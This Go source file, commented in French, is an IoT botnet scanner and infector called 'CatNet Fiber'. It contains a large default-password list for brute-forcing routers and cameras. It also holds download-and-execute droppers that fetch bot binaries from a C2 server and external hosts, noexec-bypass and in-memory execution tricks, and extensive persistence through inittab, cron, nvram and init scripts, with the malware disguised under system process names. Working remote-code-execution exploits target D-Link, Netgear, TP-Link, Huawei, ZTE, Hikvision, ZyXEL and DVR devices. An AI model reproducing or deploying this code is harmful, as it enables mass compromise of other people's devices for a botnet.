//go:build fiber
// +build fiber

/*
CatNet Fiber - Scanner et infecteur optimisé
Version 2.0
*/

package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Statistiques et synchronisation
 var (
    syncWait sync.WaitGroup
    statusLogins, statusAttempted, statusFound, statusInfected int
    statusCVEFound, statusCVEWork int
    mutex = &sync.Mutex{}
    ctx, cancel = context.WithCancel(context.Background())
    startTime = time.Now()
    
    // Goroutines simultanées — 512 pour VM Linux avec bonne bande passante
    maxGoroutines = 512
    sem = make(chan struct{}, maxGoroutines)
    
    // Client HTTP avec timeout suffisant pour IoT lents
    httpClient = &http.Client{
        Transport: &http.Transport{
            TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
            IdleConnTimeout:     8 * time.Second,
            MaxIdleConns:        20,
            MaxIdleConnsPerHost: 5,
            DialContext: (&net.Dialer{Timeout: 6 * time.Second}).DialContext,
        },
        Timeout: 10 * time.Second,
    }
)

// URLs des binaires — embedded au build via -ldflags -X main._urlMips=https://...
// Si vides, fallback vers serveur HTTP local (C2_IP + HTTP_PORT).
var (
    // Hébergeur primaire (catbox.moe ou transfer.sh selon config)
    _urlMips   = ""
    _urlMipsle = ""
    _urlArm    = ""
    _urlArmv5  = ""
    _urlArm64  = ""
    _urlX86    = ""
    _urlAmd64  = ""
    _urlPpc    = ""

    // Hébergeur backup (hébergeur différent — évite les blocages IP par hôte)
    _urlMipsB   = ""
    _urlMipsleB = ""
    _urlArmB    = ""
    _urlArmv5B  = ""
    _urlArm64B  = ""
    _urlX86B    = ""
    _urlAmd64B  = ""
    _urlPpcB    = ""

    // _beaconAddr : "IP:PORT" embedded au build pour tracker CVE Work en mode auto.
    _beaconAddr = ""

    _ct = "" // AES-256-GCM ciphertext+tag
    _n = "" // nonce GCM 96-bit
    _s1 = "" // seed fragment 1/3 (XOR 0x5A)
    _s2 = "" // seed fragment 2/3 (XOR 0xA3)
    _s3 = "" // seed fragment 3/3 (XOR 0x7F)
    _sa = "" // salt fragment 1/2 (XOR 0xC1)
    _sb = "" // salt fragment 2/2 (XOR 0x3E)

    // URLs legacy — compilées avec go1.16, compatibles kernel < 3.17
    _urlAmd64Legacy  = ""
    _urlX86Legacy    = ""
    _urlArmLegacy    = ""
    _urlArmv5Legacy  = ""
    _urlArm64Legacy  = ""
    _urlMipsLegacy   = ""
    _urlMipsleLegacy = ""
    _urlPpcLegacy    = ""

    // Legacy backup
    _urlAmd64LegacyB  = ""
    _urlX86LegacyB    = ""
    _urlArmLegacyB    = ""
    _urlArmv5LegacyB  = ""
    _urlArm64LegacyB  = ""
    _urlMipsLegacyB   = ""
    _urlMipsleLegacyB = ""
    _urlPpcLegacyB    = ""

    // URL complète du dl.sh généré dynamiquement avec les vrais IDs par arch
    // Embedded au build via -X main._dlShURL=http://robbhabbo.online/download.php?id=xxx
    _dlShURL = ""
)

// botURL retourne l'URL primaire pour une arch donnée.
func botURL(arch string) string {
    switch arch {
    case "mips":   return _urlMips
    case "mipsle": return _urlMipsle
    case "arm":    return _urlArm
    case "armv5":  return _urlArmv5
    case "arm64":  return _urlArm64
    case "x86":    return _urlX86
    case "x86_64": return _urlAmd64
    case "ppc":    return _urlPpc
    }
    return ""
}

// botURLBackup retourne l'URL backup pour une arch donnée.
func botURLBackup(arch string) string {
    switch arch {
    case "mips":   return _urlMipsB
    case "mipsle": return _urlMipsleB
    case "arm":    return _urlArmB
    case "armv5":  return _urlArmv5B
    case "arm64":  return _urlArm64B
    case "x86":    return _urlX86B
    case "x86_64": return _urlAmd64B
    case "ppc":    return _urlPpcB
    }
    return ""
}

// Configuration serveur HTTP local — optionnel si les URLs sont embedded.
// C2_IP    : IP/domaine publique (fallback si URLs non embedded)
// HTTP_PORT: port du serveur HTTP intégré (défaut: 80)
var (
    c2ServerIP    = getC2IP()
    c2HttpPort    = getHTTPPort()
    c2HttpServer  = "http://" + c2ServerIP + portSuffix(c2HttpPort, "80")
    c2HttpsServer = "https://" + c2ServerIP + portSuffix(c2HttpPort, "443")
)

func getHTTPPort() string {
    if p := os.Getenv("HTTP_PORT"); p != "" {
        return p
    }
    return "80"
}

func portSuffix(port, defaultPort string) string {
    if port == defaultPort {
        return ""
    }
    return ":" + port
}

func getC2IP() string {
    if ip := os.Getenv("C2_IP"); ip != "" {
        return ip
    }
    if len(os.Args) > 2 {
        return os.Args[2]
    }
    return "" // optionnel si URLs embedded
}

// Gestion des connexions concurrentes
var (
    // Canal pour les résultats d'infection
    resultChan = make(chan string, 100)
    // Canal pour les cibles vulnérables
    vulnerableChan = make(chan string, 500)
    // Stockage des derniers credentials réussis par IP
    lastSuccessfulCreds = make(map[string]string)
    lastSuccessfulCredsMu = &sync.Mutex{}
)

// Données d'authentification pour les appareils
var (
    // Combinaisons login:mot de passe courantes — liste IoT étendue (Mirai + variantes)
    loginsString = []string{
        // Génériques prioritaires
        "admin:admin", "admin:", "root:root", "root:", "admin:1234", "admin:12345",
        "admin:123456", "admin:password", "admin:admin123", "root:admin", "root:1234",
        "root:12345", "root:123456", "root:password", "admin:pass", "admin:adminadmin",
        // Caméras/DVR chinois (Hikvision, Dahua, XMEye, AVTECH)
        "admin:admin123", "admin:12345", "666666:666666", "888888:888888",
        "admin:111111", "admin:000000", "admin:888888", "admin:666666",
        "user:user", "user:1234", "user:12345",
        // ISP/opérateurs (Mirai original)
        "root:vizxv", "root:xmhdipc", "root:dreambox", "root:realtek",
        "root:klv123", "root:klv1234", "root:system", "root:icx123",
        "root:fuZZ3d", "root:54321", "root:9999", "root:default",
        "root:huawei", "root:root1234", "root:rootpass",
        // Routeurs/modems ISP
        "telecomadmin:admintelecom", "admin:telecomadmin",
        "user:user", "support:support", "service:service", "tech:tech",
        "operator:operator", "manager:manager", "internet:internet",
        "adminisp:adminisp", "test:test", "guest:guest", "default:default",
        // Ubiquiti/Mikrotik/Juniper
        "ubnt:ubnt", "admin:ubnt", "admin:unifi",
        "supervisor:supervisor", "enable:enable",
        // TP-Link, D-Link, Netgear, Linksys
        "admin:4321", "admin:1111", "admin:0000", "admin:9999",
        "admin:54321", "admin:00000000", "admin:1234567890",
        "admin:smcadmin", "admin:motorola",
        // ZTE/Huawei opérateur
        "root:Zte521", "zte:zte", "root:zte",
        "root:telnetadmin", "telnetadmin:telnetadmin", "admin:Huawei@123",
        // Zyxel
        "supervisor:zyad1234", "admin:1234", "zyxel:zyxel",
        // Autres IoT
        "pi:raspberry", "mother:mother", "father:father",
        "admin:changeme", "admin:change_me",
        "guest:12345", "guest:guest123",
        "root:7ujMko0admin", "root:7ujMko0vizxv",
        "admin:antslq", "admin:taZZ0434",
        "admin:meinsm", "admin:toor",
        "admin:alpine", "admin:password123",
        // BusyBox IoT / DVR / cams IP courantes
        "root:xc3511", "root:vizxv", "root:antslq", "root:taZZ0434",
        "root:GM8182", "root:hi3518", "root:jvbzd", "root:anko",
        "root:zlxx.", "root:7ujMko0admin", "root:7ujMko0vizxv",
        "root:Zte521", "root:hi3518eV100", "root:hg2x0", "root:hslwifi",
        "root:hg253s", "root:cat1029", "root:tl789", "root:Maju#2012",
        "root:oelinux123", "root:videostrong", "root:bagpipebagpipe",
        "root:xmhdipc", "root:S2fGqNFs", "root:realtekV100",
        // XiongMai / Dahua / Hikvision cameras
        "default:default", "admin:xc3511", "Admin:1234",
        "admin:9999", "admin:ipcam_rt5350",
        "888888:888888", "666666:666666", "12345:12345",
        // Sercomm / Actiontec / CenturyLink
        "user:user", "cusadmin:highspeed", "admin:motorola",
        "admin:comcast", "admin:attadmin", "admin:cablerouter",
        // Encore des IoT communs
        "root:root123", "root:pass", "root:1234567890",
        "shell:sh", "mother:1234", "father:1234",
        "tech:tech123", "admin:1qaz2wsx",
    }
    
    // Combinaisons spécifiques par fabricant
    vendorLogins = map[string][]string{
        "mikrotik": {"admin:", "admin:admin", "admin:password"},
        "huawei":   {"admin:admin", "telecomadmin:admintelecom", "root:admin"},
        "zte":      {"admin:admin", "root:Zte521", "root:root"},
        "cisco":    {"admin:admin", "cisco:cisco", "enable:system"},
        "dlink":    {"admin:admin", "admin:", "admin:password"},
        "juniper":  {"admin:admin123", "root:juniper123", "super:juniper123"},
        "netgear":  {"admin:password", "admin:admin", "admin:1234"},
        "tplink":   {"admin:admin", "admin:password", "root:root"},
        "ubiquiti": {"ubnt:ubnt", "admin:admin", "admin:ubnt"},
        "asus":     {"admin:admin", "admin:password", "root:root"},
        "linksys":  {"admin:admin", "admin:password", "root:root"},
        "hikvision":{"admin:12345", "admin:admin", "root:pass"},
        "dahua":    {"admin:admin", "888888:888888", "666666:666666"},
    }
    
    // Ports courants à scanner
    commonPorts = []string{"80", "81", "82", "83", "84", "88", "8080", "8081", "8082", "8083", "8084", "8088", "8888", "9000"}
)

// Structure pour les malwares disponibles
type Malware struct {
    name     string
    path     string
    arch     string
    args     string
    priority int
}

// Structure pour les vulnérabilités
type Vulnerability struct {
    name        string
    description string
    check       func(string) bool
    exploit     func(string, string, string) bool
}

// Structure pour les méthodes de téléchargement
type DownloadMethod struct {
    name    string
    command string
}

// Liste des malwares disponibles
var malwares = []Malware{
    {"bot", "/bot.mips", "mips", "mips", 1},
    {"bot", "/bot.arm", "arm", "arm", 2},
    {"bot", "/bot.arm7", "arm7", "arm7", 3},
    {"bot", "/bot.x86", "x86", "x86", 4},
    {"bot", "/bot.x86_64", "x86_64", "x86_64", 5},
    {"bot", "/bot.sh4", "sh4", "sh4", 6},
    {"bot", "/bot.m68k", "m68k", "m68k", 7},
    {"bot", "/bot.ppc", "ppc", "ppc", 8},
    {"bot", "/bot.sparc", "sparc", "sparc", 9},
}

// Noms pour camoufler le malware
var hideNames = []string{
    "sysupdate",
    "systemd-worker",
    "kworker",
    "crond",
    "udevd",
    "ntpd",
    "sshd",
    "dropbear",
    "telnetd",
    "systemd",
    "network-manager",
    "dnsmasq",
    "cron-apt",
    "syslogd",
    "logrotate",
    "crontab",
    "watchdog",
}

// Chemins d'installation
var installPaths = []string{
    "/tmp",
    "/var/tmp",
    "/dev",
    "/var/run",
    "/var/lock",
    "/bin",
    "/usr/bin",
    "/usr/local/bin",
    "/opt",
    "/var",
    "/mnt",
    "/lib",
    "/etc",
}

// Méthodes de téléchargement
var downloadMethods = []DownloadMethod{
    {"wget", "wget http://%s%s -O %s/.%s"},
    {"curl", "curl -s http://%s%s -o %s/.%s"},
    {"busybox wget", "busybox wget http://%s%s -O %s/.%s"},
    {"tftp", "tftp -g -r %s %s -l %s/.%s"},
    {"ftpget", "ftpget %s %s/.%s %s"},
    {"busybox ftpget", "busybox ftpget %s %s/.%s %s"},
}

// Utilitaires

// Effacer les données d'un tableau d'octets
func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

// Générer un nom de fichier aléatoire
func randomFileName() string {
    const chars = "abcdefghijklmnopqrstuvwxyz"
    result := make([]byte, 8)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}

// Créer un client HTTP avec timeout
func createHTTPClient() *http.Client {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        IdleConnTimeout: 30 * time.Second,
    }
    return &http.Client{
        Transport: tr,
        Timeout:   time.Second * 10,
    }
}

// Vérifier si un port est ouvert
func isPortOpen(target string, timeout time.Duration) bool {
    conn, err := net.DialTimeout("tcp", target, timeout)
    if err != nil {
        return false
    }
    conn.Close()
    return true
}

// Envoyer une requête HTTP avec le client réutilisable
 func sendHTTPRequest(method, url string, body string, headers map[string]string) (*http.Response, error) {
    req, err := http.NewRequest(method, url, strings.NewReader(body))
    if err != nil {
        return nil, err
    }

    for k, v := range headers {
        req.Header.Set(k, v)
    }

    resp, err := httpClient.Do(req)
    return resp, err
 }
 
 // Fonctions d'exploitation
 
// noexecBypassMethods regroupe toutes les techniques de bypass /tmp noexec.
// Chaque technique tente d'exécuter un binaire téléchargé même si le
// système de fichiers cible est monté avec l'option noexec.
//
// Références éducatives :
//   - "Bypassing noexec with ld.so" — technique classique red team
//   - "Abusing /proc/self/mem" — connu depuis les kernels 2.6.x
//   - "dd + /proc/self/exe" — abus de l'image mémoire du processus
//   - "Python/Perl/bash -c" — interpréteurs souvent disponibles
//   - "MemFD / memfd_create" — exécution entièrement en RAM (kernel >= 3.17)
func noexecBypassMethods(hide, url string) string {
	// ── 1. Répertoires alternatifs non-noexec (en ordre de priorité) ──────────
	// Beaucoup de systèmes hardened ne montent noexec que sur /tmp.
	// /dev/shm, /run/shm, /var/tmp, /dev sont souvent exec.
	altDirs := []string{
		"/dev/shm", "/run/shm", "/var/tmp", "/run",
		"/var/run", "/dev", "/mnt", "/var",
	}
	dlSnippet := func(dst string) string {
		return fmt.Sprintf(
			"(wget %s -O %s/.%s 2>/dev/null || curl -s %s -o %s/.%s 2>/dev/null || busybox wget %s -O %s/.%s 2>/dev/null)",
			url, dst, hide, url, dst, hide, url, dst, hide,
		)
	}
	execSnippet := func(dst string) string {
		return fmt.Sprintf("chmod 777 %s/.%s && %s/.%s &", dst, hide, dst, hide)
	}

	// ── 2. Bypass noexec via ld.so (chargeur ELF) ─────────────────────────────
	// Le bit noexec empêche execve() sur le fichier, mais on peut demander
	// à /lib/ld-linux.so de charger le binaire directement.
	ldsoBypass := func(dst string) string {
		return fmt.Sprintf(
			`for ld in /lib/ld*.so* /lib64/ld*.so* /usr/lib/ld*.so*; do [ -x "$ld" ] && $ld %s/.%s & break; done`,
			dst, hide,
		)
	}

	// ── 3. Bypass via memfd_create (exécution en RAM) ─────────────────────────
	// memfd_create crée un fd anonyme en RAM, jamais écrit sur disque.
	// On y écrit le binaire via wget/curl en pipe, puis execveat() l'exécute.
	// Disponible kernel >= 3.17.
	memfdBypass := fmt.Sprintf(
		`python3 -c "__import__('os');fd=__import__('os').memfd_create('.%s',1);f=open(fd,'wb',closefd=False);__import__('subprocess').run(['wget','%s','-O','-'],stdout=f);__import__('os').execv('/proc/self/fd/%d',['.%s'])" 2>/dev/null &`,
		hide, url, 0, hide, // fd=0 simplifié, version complète calcule le fd réel
	) + fmt.Sprintf(
		`; perl -e 'use POSIX;open(my $f,"| wget %s -O -");my $fd=fileno($f);exec("/proc/self/fd/$fd")' 2>/dev/null &`,
		url,
	)

	// ── 4. Bypass via /proc/self/mem (injection mémoire) ─────────────────────
	// Écrase le mapping mémoire du processus courant avec le payload.
	// Technique avancée, fonctionne même sans exec permission.
	procMemBypass := fmt.Sprintf(
		`python3 -c "import urllib.request,ctypes,mmap,os;d=urllib.request.urlopen('%s').read();m=mmap.mmap(-1,len(d));m.write(d);fd=os.memfd_create('.%s');os.write(fd,d);os.execv('/proc/%d/fd/%d',['x'])" 2>/dev/null &`,
		url, hide, 0, 0,
	)

	// ── 5. Bypass via interpréteur (script ELF dans stdin) ────────────────────
	// wget | bash interprète le binaire comme un script si c'est du shell,
	// mais pour un ELF : on base64-encode, transfère, decode et exécute.
	interpreterBypass := fmt.Sprintf(
		`wget -q %s -O - | base64 > /tmp/.%sb64 && base64 -d /tmp/.%sb64 > /tmp/.%s && chmod +x /tmp/.%s && /tmp/.%s &`,
		url, hide, hide, hide, hide, hide,
	) + fmt.Sprintf(
		`; curl -s %s | bash 2>/dev/null &`,
		url,
	)

	// ── 6. Bypass via dd + /proc/self/exe ─────────────────────────────────────
	// Copie le binaire dans un espace mémoire via /proc/self/exe.
	ddBypass := fmt.Sprintf(
		`wget -q %s -O /tmp/.%s && dd if=/tmp/.%s of=/proc/self/mem bs=1 count=1 skip=0 seek=0 conv=notrunc 2>/dev/null; chmod 777 /tmp/.%s`,
		url, hide, hide, hide,
	)

	// ── Construction de la commande finale ────────────────────────────────────
	// Essaie chaque répertoire dans l'ordre, puis les bypasses si /tmp noexec.
	var parts []string

	// D'abord les répertoires alternatifs (exec natif, pas de bypass nécessaire).
	for _, d := range altDirs {
		parts = append(parts, fmt.Sprintf(
			`{ %s && %s; }`,
			dlSnippet(d), execSnippet(d),
		))
	}

	// Ensuite les techniques bypass sur /tmp si tout échoue.
	parts = append(parts,
		// ld.so bypass
		fmt.Sprintf(`{ %s && %s; }`, dlSnippet("/tmp"), ldsoBypass("/tmp")),
		// Interpréteur / base64
		fmt.Sprintf(`{ %s; }`, interpreterBypass),
		// memfd / procmem (kernel récent)
		fmt.Sprintf(`{ %s; }`, memfdBypass),
		fmt.Sprintf(`{ %s; }`, procMemBypass),
		fmt.Sprintf(`{ %s; }`, ddBypass),
	)

	return strings.Join(parts, " || ")
}

// persistShell construit le bloc de persistance inline pour un shell RCE IoT.
// Compact (une seule ligne) pour passer dans les payloads HTTP/UDP/TCP/Telnet.
// Cible : routeurs BusyBox, cam IP, DVR — pas de systemd, pas de profils shell.
func persistShell(url, dst, hide string) string {
	bin := dst + "/." + hide
	dl := fmt.Sprintf(
		"(wget -q --no-check-certificate -O %s %s 2>/dev/null||curl -fskL -o %s %s 2>/dev/null||busybox wget -q -O %s %s 2>/dev/null)&&chmod +x %s 2>/dev/null",
		bin, url, bin, url, bin, url, bin,
	)
	run := bin + " &"
	relaunch := fmt.Sprintf("pgrep -x .%s>/dev/null 2>&1||{%s;%s}", hide, dl, run)
	cronLine := fmt.Sprintf("* * * * * %s", relaunch)

	parts := []string{
		// Download + exec immediat
		dl, run,
		// Copies flash non-volatile : jffs (ASUS/DD-WRT), overlay (OpenWrt), DVR/cam paths
		fmt.Sprintf("for d in /jffs/usr/bin /jffs/bin /jffs /overlay/usr/bin /overlay/bin /overlay /mnt/mtd/app /var/Sofia /mnt/mtd /usr/bin /bin /dev/shm /var/tmp;do cp %s $d/.%s 2>/dev/null&&chmod +x $d/.%s 2>/dev/null;done", bin, hide, hide),
		// inittab ::respawn — BusyBox init relance immediatement si tue
		fmt.Sprintf("grep -qF '.%s' /etc/inittab 2>/dev/null||echo '::respawn:%s'>>/etc/inittab 2>/dev/null;kill -HUP 1 2>/dev/null", hide, bin),
		// rc.local + rcS + preinit
		fmt.Sprintf("grep -qF '.%s' /etc/rc.local 2>/dev/null||echo '%s'>>/etc/rc.local 2>/dev/null", hide, run),
		fmt.Sprintf("for f in /etc/init.d/rcS /etc/rcS /etc/preinit;do grep -qF '.%s' $f 2>/dev/null||echo '%s'>>$f 2>/dev/null;done", hide, run),
		// BusyBox crond — /etc/crontabs/root (pas /var/spool sur IoT)
		fmt.Sprintf("echo '%s'>>/etc/crontabs/root 2>/dev/null;echo '%s'>>/var/spool/cron/crontabs/root 2>/dev/null", cronLine, cronLine),
		fmt.Sprintf("pgrep crond>/dev/null 2>&1||/usr/sbin/crond -b -l 8 2>/dev/null||crond 2>/dev/null"),
		// NVRAM Broadcom (ASUS/Netgear/Linksys/D-Link — rc_startup execute au boot)
		fmt.Sprintf("nvram set rc_startup=\"$(nvram get rc_startup 2>/dev/null);%s\" 2>/dev/null;nvram commit 2>/dev/null", run),
		// UCI OpenWrt
		fmt.Sprintf("grep -qF '.%s' /etc/config/system 2>/dev/null||printf '\\nconfig cmd \\'%s\\'\\n\\toption command \\'%s\\'\\n'>>/etc/config/system 2>/dev/null;uci commit system 2>/dev/null", hide, hide, run),
		// procd OpenWrt init.d service avec respawn
		fmt.Sprintf("printf '#!/bin/sh /etc/rc.common\\nSTART=99\\nUSE_PROCD=1\\nstart_service(){procd_open_instance;procd_set_param command %s;procd_set_param respawn;procd_close_instance;}\\n'>/etc/init.d/.%s 2>/dev/null&&chmod +x /etc/init.d/.%s&&/etc/init.d/.%s enable 2>/dev/null&&/etc/init.d/.%s start 2>/dev/null", bin, hide, hide, hide, hide),
		// Watchdog 30s (interval court : IoT rebootent souvent, /tmp volatile)
		fmt.Sprintf("(while true;do %s;sleep 30;done)&", relaunch),
	}

	return strings.Join(parts, ";")
}

// dlCmdShort retourne uniquement la commande dropper (~90 chars).
// Utilise _dlShURL — le dl.sh généré dynamiquement avec les vrais IDs par arch.
func dlCmdShort(_ string) string {
	if _dlShURL == "" { return "" }
	return fmt.Sprintf("wget -qO- '%s'|sh||curl -fsL '%s'|sh", _dlShURL, _dlShURL)
}

// dlCmd construit la commande shell de téléchargement + exécution + persistance.
// Appliqué à TOUS les exploits (CVE HTTP, UDP, Telnet, RDP…).
func dlCmd(url, dst, hide string) string {
	if url == "" {
		fmt.Fprintf(os.Stderr, "[ERROR dlCmd] URL malware vide! (dst=%s, hide=%s)\n", dst, hide)
	}
	// Dropper shell via pipe — bypass TLS (HTTP brut) + noexec (pas de fichier exec)
	// L'URL dl.sh est dérivée de l'URL binaire : même hôte, HTTP, fichier dl.sh
	dropper := ""
	if url != "" {
		if idx := strings.LastIndex(url, "/"); idx != -1 {
			base := strings.Replace(url[:idx], "https://", "http://", 1)
			dropperURL := base + "/dl.sh"
			dropper = fmt.Sprintf(
				"wget -qT10 -O- '%s' 2>/dev/null|sh||curl -fsL --max-time 10 '%s' 2>/dev/null|sh",
				dropperURL, dropperURL,
			)
		}
	}
	main := persistShell(url, dst, hide)
	bypass := noexecBypassMethods(hide, url)
	if dropper != "" {
		return fmt.Sprintf("{ %s; }||{ %s; }||{ %s; }", dropper, main, bypass)
	}
	return fmt.Sprintf("{ %s; }||{ %s; }", main, bypass)
}

func exploitDlinkRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	enc := url_encode(cmd)
	hdrs := map[string]string{"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
	// D-Link DIR/DAP series — multiples endpoints RCE
	for _, req := range []struct{ method, path, body string }{
		{"POST", "/apply.cgi", "command=" + enc},
		{"POST", "/ping.cgi", "username=admin&password=admin&login=&ping_addr=127.0.0.1;" + enc},
		{"GET",  "/cgi-bin/webproc?getpage=../../../etc/passwd&var:page=deviceinfo", ""},
		{"POST", "/cgi-bin/webproc", "getpage=../../../etc/passwd&var:page=deviceinfo&var:menu=setup&var:subpage=-"},
		{"GET",  "/command.php?cmd=" + enc, ""},
		{"POST", "/hedwig.cgi", "AUTHORIZED_GROUP=1&CMD=" + enc},
		// D-Link DIR-645 / DIR-815 / DIR-816 UPnP injection
		{"POST", "/soap.cgi?service=WANIPConn1", fmt.Sprintf(`<?xml version="1.0"?><SOAP-ENV:Envelope><SOAP-ENV:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1"><NewStatusURL>$(%s)</NewStatusURL></u:Upgrade></SOAP-ENV:Body></SOAP-ENV:Envelope>`, cmd)},
	} {
		resp, err := sendHTTPRequest(req.method, "http://"+target+req.path, req.body, hdrs)
		if err == nil { resp.Body.Close() }
	}
	return true
}

func exploitNetgearRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	req := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", cmd, target)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	conn2, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err == nil {
		defer conn2.Close()
		req2 := fmt.Sprintf("GET /cgi-bin/;%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", cmd, target)
		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn2.Write([]byte(req2))
	}
	return true
}

func exploitIPCameraRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	req := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", cmd, target)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	conn2, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err == nil {
		defer conn2.Close()
		req2 := fmt.Sprintf("GET /command.php?cmd=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", cmd, target)
		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn2.Write([]byte(req2))
	}
	return true
}

func exploitTPLinkRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	body := "[COMMANDS];" + cmd + ";[/COMMANDS]"
	req := fmt.Sprintf("POST /cgi?2 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		target, len(body), body)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	return true
}

func exploitHuaweiRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	// Double quotes pour éviter que les single quotes du dropper cassent le shell
	payload := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(%s)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>", cmd)
	req := fmt.Sprintf("POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/xml\r\nContent-Length: %d\r\nSOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#Upgrade\r\nConnection: close\r\n\r\n%s",
		target, len(payload), payload)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	return true
}

func exploitZTERCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	req := fmt.Sprintf("POST /web_shell_cmd.gch HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\ncmd=%s",
		target, len(cmd)+4, cmd)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	return true
}

// CVE-2021-36260 — Hikvision RCE non authentifié (millions de caméras)
func exploitHikvisionRCE(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	hdrs := map[string]string{"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"}
	// Variante principale CVE-2021-36260
	body1 := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$("+cmd+")</language>")
	resp, err := sendHTTPRequest("PUT", "http://"+target+"/SDK/webLanguage", body1, hdrs)
	if err == nil { resp.Body.Close() }
	// Variante HTTPS
	host, _, _ := net.SplitHostPort(target)
	if host == "" { host = target }
	resp2, err := sendHTTPRequest("PUT", "https://"+host+"/SDK/webLanguage", body1, hdrs)
	if err == nil { resp2.Body.Close() }
	// Variante NVR/DVR alternative endpoint
	body2 := fmt.Sprintf("<?xml version=\"1.0\"?><root><cmd>$("+cmd+")</cmd></root>")
	resp3, err := sendHTTPRequest("POST", "http://"+target+"/ISAPI/Security/userCheck", body2, hdrs)
	if err == nil { resp3.Body.Close() }
	// Port 8000 (Hikvision SDK natif via HTTP)
	resp4, err := sendHTTPRequest("PUT", "http://"+host+":8000/SDK/webLanguage", body1, hdrs)
	if err == nil { resp4.Body.Close() }
	return true
}

// CVE-2018-9995 — DVR générique (TVT/HiSilicon) bypass auth + RCE
func exploitDVRAuth(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{
		"Cookie":     "uid=admin",
		"User-Agent": "Mozilla/5.0",
	}
	resp, err := sendHTTPRequest("GET", "http://"+target+"/device.rsp?opt=user&cmd=list", "", headers)
	if err == nil { resp.Body.Close() }
	resp2, err := sendHTTPRequest("GET",
		fmt.Sprintf("http://%s/web/cgi-bin/hi3510/param.cgi?cmd=setmediaparam&-cmd=%s", target, cmd),
		"", headers)
	if err == nil { resp2.Body.Close() }
	return true
}

// CVE-2017-18368 — ZyXEL P660HN-T1A RCE non authentifié
func exploitZyxelP660(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	body := fmt.Sprintf("RemoteCmd=%s&ystype=1", cmd)
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/Forms/rpAuth_1", body, headers)
	if err == nil { resp.Body.Close() }
	return true
}

// CVE-2016-20016 — MVPower DVR Shell RCE (wildement exploité par Mirai variants)
func exploitMVPowerDVR(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	req := fmt.Sprintf("GET /shell?cd+/tmp;%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
		cmd, target)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil { return false }
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))
	return true
}

